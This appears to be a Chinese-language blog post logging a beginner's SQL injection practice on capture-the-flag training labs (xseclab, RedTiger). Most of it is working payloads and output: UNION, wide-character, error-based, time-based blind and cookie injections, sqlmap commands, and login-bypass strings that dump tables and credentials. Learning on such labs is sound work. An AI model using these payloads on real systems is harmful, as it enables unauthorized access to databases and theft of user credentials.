---
title: sql注入入门
date: 2017-08-06 10:08:25
tags:
- sql注入
- web安全
category:
- web安全
- sql
- sql注入
---

本篇记录了尝试从零基础入门SQL注入，包括简单的注入、宽字符注入、利用报错信息注入...

<!-- more -->


# 练习网站

[网络信息安全攻防学习平台](http://hackinglab.cn/index.php)

mysql中select的格式：
```
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name' export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```


## 防注入

	利用宽字符将`'`注入

	猜测闭合字符：

		输入 `'`，报错；而输入`'#`未报错。
	判断列 order by 4

	判断显示位
	union all select 1,2,3,4


	查询语句
	union all select 1,user(),3,4  用户
	database()数据库
	version()版本


可以利用python的包来作相关处理，比如：
查看特殊字符url转义。
```
In [30]: import urllib
In [30]: urllib.quote('\'')
Out[30]: '%27'
In [31]: urllib.unquote('%23')
Out[31]: '#'
```

转换字符串为二进制并用十六进制表示
```
In [33]: import binascii

In [34]: binascii.hexlify('mydbs')
Out[34]: '6d79646273'
```

查数据库表
```
http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,concat(group_concat(distinct+table_name)),3%20%20from%20information_schema.tables%20where%20table_schema=0x6d79646273%23
```

	sae_user_sqli4

查表中对应的字段
```
http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,concat(group_concat(distinct+column_name)),3%20%20from%20information_schema.columns%20where%20table_name=0x7361655f757365725f73716c6934%23
```

	id,title_1,content_1

## 到底能不能回显

关于`limit`命令的注入。

得到数据库名称：
```
procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, schema_name ,0x7e) from information_schema.schemata))),1)%23&num=1
```

	XPATH syntax error: ':~information_schema~,~mydbs~,~t' 

`mydbs` 0x6d79646273

procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, table_name,0x7e) from information_schema.tables where table_schema=0x6d79646273 ))),1)%23&num=1

	XPATH syntax error: ':~article~,~user~' 

得到table name:

```
procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, table_name,0x7e) from information_schema.tables where table_schema=database() limit 1,1))),1)%23&num=1
```

`user`二级制`0x75736572`

由于`group_concat`得出的结果有长度限制，只能limit一个字段一个字段泄露。
```
procedure analyse(extractvalue(rand(), concat(0x3a,(select concat(0x7e, column_name, 0x7e) from information_schema.columns where table_name=0x75736572 limit 2,1))),1)%23&num=1
```

	四个字段 id,username,password,lastloginIP

获取各个字段
```
procedure analyse(extractvalue(rand(), concat(0x3a,(select concat(0x7e,username,0x3a, password, 0x7e) from user limit 2,1))),1)%23&num=1
```

	XPATH syntax error: ':~flag:myflagishere~'

## 邂逅

从图片请求入手，不能在浏览器通过正常请求测试是否有注入点，应当在BurpSuite中操作。

```
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27
```

```
# 判断列，直到5报错
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20order%20by%205%23
# 判断显示位, 回显3
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,3,4%20%23
# 获取当前数据库的表名article,pic 
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(distinct+table_name)),4%20%20from%20information_schema.tables%20where%20table_schema=database()%23
# 查找article的字段，'article'=>0x61727469636c65
## 得到 id,title,content,others 
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(column_name)),4%20%20from%20information_schema.columns%20where%20table_name=0x61727469636c65%23
## 得到数据
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(title,content),0x3a),4%20%20from%20article%23
未得到有用信息

# 查找pic的字段，'pic'=>0x706963
## 得到 id,picname,data,text 
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(column_name)),4%20%20from%20information_schema.columns%20where%20table_name=0x706963%23
## 得到数据
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(picname,0x7e),0x3a),4%20%20from%20pic%23
得到 dog1.jpg~,cat1.jpg~,flagishere_askldjfklasjdfl.jpg~:

```
在浏览器访问flagishere_askldjfklasjdfl.jpg即可得到flag。


## 6.ErrorBased 

- 猜测闭合字符
- 猜测列数
- 尝试得到显示位
- 得到数据库

题目是基于错误的，用到的报错语句为：
```
select count(*),concat(0x3a,0x3a,(注入代码),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
如
select concat(0x3a,0x3a,(version()),0x3a,0x3a,floor(2*rand(0)))a,count(*) FROM information_schema.tables GROUP BY a

select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
#可通过urllib.quote()将其转换成url参数输入
#得到Duplicate entry '::mydbs::1' for key 'group_key'


```
接下来爆表，替换注入代码即可：
```
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database(); 
UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() LIMIT 0,1;
```

	select count(*),concat(0x3a,0x3a,(SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a

当前数据库的表依次为：`log`,`motto`,`user`

爆字段：
```
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename' limit 0,1
```

	select count(*),concat(0x3a,0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'motto' limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
依次得到：`id`,`username`,`motto`,

爆数据：


	select count(*),concat(0x3a,0x3a,(SELECT username FROM motto limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a

怎么会没有返回结果！无语了！

可通过以下方式获得:

```
and(select 1 
	from    (select count(*),concat(
									(select 
										(select 
											(SELECT DISTINCT 
												CONCAT(0x7e,username,0x7e,id,0x7e,motto,0x7e) FROM motto limit 3,1
											)
										) 
									from information_schema.tables limit 0,1
									),floor(rand(0)*2)
									)x 
			from information_schema.tables group by x)a
	)%23 
```

换一个，接着研究。
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and extractvalue(1, concat(0x3a,(SELECT distinct concat(0x3a,username,0x3a,motto,0x3a,0x3a) FROM motto limit 3,1)))%23
```
得到返回结果：

	'::#adf#ad@@#:key#notfound!#::' 

### 另一种解法

//看数据库版本 5.1.73
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//看当前用户 saeuser@220.181.129.121
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//当前数据库 mydbs
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//爆库 information_schema, mydbs, test
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//爆表 log, motto, user
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//爆字段 id, username, password
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x75736572 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23

http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x75736572 LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//读内容
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM user limit 0,1)))%23
```
//发现user表没有flag，读motto表
key#notfound!#

## 7.盲注

[盲注](https://www.jianshu.com/p/65f05e7cc957)分为两类：
　　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据　　　　你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。
　　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。

先暴库，暴库的长度
```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(length(concat(database()))=5,sleep(2),1)--+"
<html>
    <head>
        <title>SQLi4_article</title>
    </head>
    <body> 
      <div>
            <h2> </h2>
          <div class="content">username:admin'and if(length(concat(database()))=5,sleep(2),1)-- <br>status:ok </div>
        </div>
                
    </body>
</html>


real	0m8.221s
user	0m0.052s
sys	0m0.164s
```

再逐一暴库的字符。
```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(ascii(substr(concat(database()),1,1))<110,sleep(2),1)--+"
```
`m`

```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(ascii(substr(concat(database()),2,1))<122,sleep(2),1)--+"
```
`y`

```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(ascii(substr(concat(database()),3,1))<100,sleep(2),1)--+"
```
`d`

```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(ascii(substr(concat(database()),4,1))<98,sleep(2),1)--+"
```
`a`

```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(ascii(substr(concat(database()),5,1))<116,sleep(2),1)--+"
```
`s`

OK！数据库叫mydas。

报表。

```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29)=3,sleep(2),1)--+"
```
3个表。
逐一报表名。
暴露长度，并逐一暴露表名字符。
第一个表


```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20length%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)=3,sleep(2),1)--+"
```
长度3。

```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C1%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)<108,sleep(2),1)--+"
l
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C2%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)<112,sleep(2),1)--+"
o

time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C3%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)<104,sleep(2),1)--+"
g
```
NMB。
下一个。

```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20length%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)<6,sleep(2),1)--+"
长度为5

 time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C1%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)<110,sleep(2),1)--+"
`m`

time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C2%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)<112,sleep(2),1)--+"
p

time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C3%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)<117,sleep(2),1)--+"
t

time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C4%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)<116,sleep(2),1)--+"
s



```
```
time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20length%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%202%2C1)<5,sleep(2),1)--+"
长度为4

time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C1%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%202%2C1)<118,sleep(2),1)--+"
`u`



```
烦死了，直接用SQLMAP跑吧。
```
python sqlmap.py -u http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin --current-db
```
	
	Parameter: username (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: username=admin' AND SLEEP(5) AND 'Leyp'='Leyp
    ...
	current database:    'mydbs'

获取表。
```
python sqlmap.py -u http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin -D mydbs --tables
```

	Database: mydbs
	[3 tables]
	+-------+
	| user  |
	| log   |
	| motto |
	+-------+

获取`motto`的字段



## SQL注入通用防护

过滤了HTTP的GET和POST方法，头一次听说COOKIE注入。

```
curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1'"
```

	<html>
	    <head>
	        <title>SQLi8_article</title>
	    </head>
	    <body><br />
	<b>Warning</b>:  mysql_fetch_row() expects parameter 1 to be resource, boolean given in <b>sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php</b> on line <b>27</b><br />
	        
	    </body>
	</html>
那么接下来就是正常的注入过程。

- 得到字段数目
```
curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=2 order by 4"
```
字段数目为3。
- 得到显示位
```
curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,2,3"
```

显示位为2，3

- 获取当前数据库的表
```
curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()"
```
得到数据表为：`sae_manager_sqli8,sae_user_sqli8`

- 获取`sae_manager_sqli8`列名

```
curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,2, group_concat(column_name) from information_schema.columns where table_name='sae_manager_sqli8'"
```

id,username,password

- 获取数据

```
curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,username,password from sae_manager_sqli8 limit 1,1 "
```

	<html>
	    <head>
	        <title>SQLi8_article</title>
	    </head>
	    <body>      <div>
	            <h2>manager</h2>
	            <div class="content">IamFlagCookieInject!</div>
	        </div>
	        
	    </body>
	</html>


## 据说哈希后的密码是不能产生注入的

这关没有通过。。。
python关于md5的方法为：
```
import hashlib
s='ffifdyop'
d=hashlib.md5(s)

d.hexdigest()
Out[35]: '276f722736c95d99e921722cf9ed621c'

d.digest()
Out[36]: "'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c"
```


# [RegTiger](http://redtiger.labs.overthewire.org)

## level1

点击Category：1后，网址以GET方式传递`cat`参数。
### 利用`and 1=1`,`and 1=2`进行判断是否存在注入点：
```
# 正常 
https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=1 
# 运行异常
https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=2 
```
### 存在数字型注入，利用order by 测试出存在4个列： 
```
# 正常 
https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 4 
# 运行异常
https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 5 
```

### 构造union联合查询语句，找回显： 
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4 
```
发现3,4 处存在回显。

我这里继续爆库、爆表、爆字段等操作，发现异常。
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,version(), database()
```
回显

		5.5.57-0+deb8u1
		hackit
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='level1_users'
```
回显

		Some things are disabled!!!

所以无法找出`level1_users`的字段了吗？
当然不是，点击登录按钮，在浏览器调试窗口（火狐的firebug或者F12）仔细看发送请求包，可知数据是POST发送的，字段为
	
	查询字符串
		cat:1
	表单数据
		user:
		password:
		login:login

开始试了试
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,user,password from level1_users
```
结果不对，而我观察到页面中给出的是`username`，所以换成它。
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_us

```
got it.拿到用户名密码后登录即可。

## level2

绕过的sql万能密码：
```
' or '1'='1
```

## 参考网站
[1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
[2] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)


# sqli-labs

